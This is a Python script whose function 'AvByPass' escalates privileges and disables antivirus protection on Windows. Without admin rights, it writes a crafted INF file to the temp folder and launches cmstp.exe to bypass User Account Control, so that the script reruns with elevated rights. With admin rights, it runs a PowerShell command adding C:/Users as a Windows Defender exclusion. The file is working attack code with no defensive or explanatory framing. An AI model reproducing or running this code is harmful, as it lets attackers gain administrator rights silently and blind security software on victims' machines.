from tempfile import gettempdir
import ctypes
import time
from ctypes.wintypes import *
from ctypes import *
import os, sys

def AvByPass():
    print("AvByPass")
    appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
    if os.path.isfile(appdata+'\\.system'):
        return
    else:
        with open(appdata+'\\.system', 'w') as f:
            f.write('system: 0x00000040')

    DWORD = c_uint32

    SW_HIDE = 0
    SW_SHOW = 5
    SEE_MASK_NOCLOSEPROCESS = 0x00000040

    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010

    class ShellExecuteInfoW(Structure):
        _fields_ = [
            ("cbSize", DWORD),
            ("fMask", ULONG),
            ("hwnd", HWND),
            ("lpVerb", LPWSTR),
            ("lpFile", LPWSTR),
            ("lpParameters", LPWSTR),
            ("lpDirectory", LPWSTR),
            ("nShow", INT),
            ("hInstApp", HINSTANCE),
            ("lpIDList", LPVOID),
            ("lpClass", LPWSTR),
            ("hKeyClass", HKEY),
            ("dwHotKey", DWORD),
            ("hIcon", HANDLE),
            ("hProcess", HANDLE),
        ]

    ShellExecuteEx = ctypes.windll.shell32.ShellExecuteExW
    ShellExecuteEx.argtypes = [POINTER(ShellExecuteInfoW)]
    ShellExecuteEx.restype = BOOL

    QueryFullProcessImageNameW = ctypes.windll.kernel32.QueryFullProcessImageNameW
    QueryFullProcessImageNameW.argtypes = [HANDLE, DWORD, LPWSTR, POINTER(DWORD)]
    QueryFullProcessImageNameW.restype = BOOL

    OpenProcess = ctypes.windll.kernel32.OpenProcess
    OpenProcess.restype = HANDLE
    OpenProcess.argtypes = [DWORD, BOOL, DWORD]

    CloseHandle = ctypes.windll.kernel32.CloseHandle
    CloseHandle.argtypes = [LPVOID]
    CloseHandle.restype = INT

    EnumProcesses = ctypes.windll.psapi.EnumProcesses
    EnumProcesses.restype = BOOL
    EnumProcesses.argtypes = [LPVOID, DWORD, LPDWORD]


    def get_process_name(hProcess, dwFlags=0):
        ERROR_INSUFFICIENT_BUFFER = 122
        dwSize = MAX_PATH
        while 1:
            lpdwSize = DWORD(dwSize)
            lpExeName = create_unicode_buffer("", lpdwSize.value + 1)
            success = QueryFullProcessImageNameW(
                hProcess, dwFlags, lpExeName, byref(lpdwSize)
            )
            if success and 0 < lpdwSize.value < dwSize:
                break
            error = GetLastError()
            if error != ERROR_INSUFFICIENT_BUFFER:
                return False
            dwSize = dwSize + 256
            if dwSize > 0x1000:
                return False
        return lpExeName.value

    class process:
        def create(self, payload, params="", window=False, get_exit_code=False):
            shinfo = ShellExecuteInfoW()
            shinfo.cbSize = sizeof(shinfo)
            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS
            shinfo.lpFile = payload
            shinfo.nShow = SW_SHOW if window else SW_HIDE
            shinfo.lpParameters = params

            if ShellExecuteEx(byref(shinfo)):
                if get_exit_code:
                    ctypes.windll.kernel32.WaitForSingleObject(shinfo.hProcess, -1)
                    i = ctypes.c_int(0)
                    pi = ctypes.pointer(i)
                    if ctypes.windll.kernel32.GetExitCodeProcess(shinfo.hProcess, pi) != 0:
                        return i.value

                return True
            
            return False

        def runas(self, payload, params=""):
            shinfo = ShellExecuteInfoW()
            shinfo.cbSize = sizeof(shinfo)
            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS
            shinfo.lpVerb = "runas"
            shinfo.lpFile = payload
            shinfo.nShow = SW_SHOW
            shinfo.lpParameters = params
            try:
                return bool(ShellExecuteEx(byref(shinfo)))
            except:
                return False

        def enum_processes(self):
            size = 0x1000
            cbBytesReturned = DWORD()
            unit = sizeof(DWORD)
            dwOwnPid = os.getpid()
            while 1:
                process_ids = (DWORD * (size // unit))()
                cbBytesReturned.value = size
                EnumProcesses(byref(process_ids), cbBytesReturned, byref(cbBytesReturned))
                returned = cbBytesReturned.value
                if returned < size:
                    break
                size = size + 0x1000
            process_id_list = []
            for pid in process_ids:
                if pid is None:
                    break
                if pid == dwOwnPid and pid == 0:
                    continue
                process_id_list.append(pid)
            return process_id_list

        def enum_process_names(self):
            pid_to_name ={}
            for pid in self.enum_processes():
                name = False
                try:
                    process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
                except:
                    continue
                name = get_process_name(process_handle)
                if name:
                    pid_to_name[pid] = name
                if process_handle:
                    CloseHandle(process_handle)
            return pid_to_name

        def get_process_pid(self, processname):
            for pid, name in self.enum_process_names().items():
                if processname in name:
                    return pid

        def terminate(self, processname):
            pid = self.get_process_pid(processname)
            if pid:
                try:
                    phandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
                    os.kill(pid, phandle)
                    return True
                except Exception:
                    pass
            return False


    def uacMethod13_cleanup():
        try: os.remove(os.path.join(gettempdir(), 'tmp.ini'))
        except: return False


    inf_template = """[version]
    Signature=$chicago$
    AdvancedINF=2.5

    [DefaultInstall]
    CustomDestination=CustInstDestSectionAllUsers
    RunPreSetupCommands=RunPreSetupCommandsSection

    [RunPreSetupCommandsSection]
    """ + f'"{sys.argv[0]}' + """
    taskkill /IM cmstp.exe /F

    [CustInstDestSectionAllUsers]
    49000,49001=AllUSer_LDIDSection, 7

    [AllUSer_LDIDSection]
    "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

    [Strings]
    ServiceName="WinPwnageVPN"
    ShortSvcName="WinPwnageVPN"
    """


    def uacMethod():
        try:
            with open(os.path.join(gettempdir(), 'tmp.ini'), 'w') as ini_file:
                ini_file.write(inf_template)
        except:
            return False

        time.sleep(1)

        process().terminate('cmstp.exe')

        time.sleep(1)

        process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(gettempdir(), "tmp.ini")), window=False)

        time.sleep(1)

        ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0)
        time.sleep(3)
        uacMethod13_cleanup()


    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0


    if not is_admin:
        uacMethod()
    else:
        os.system('powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:/Users"')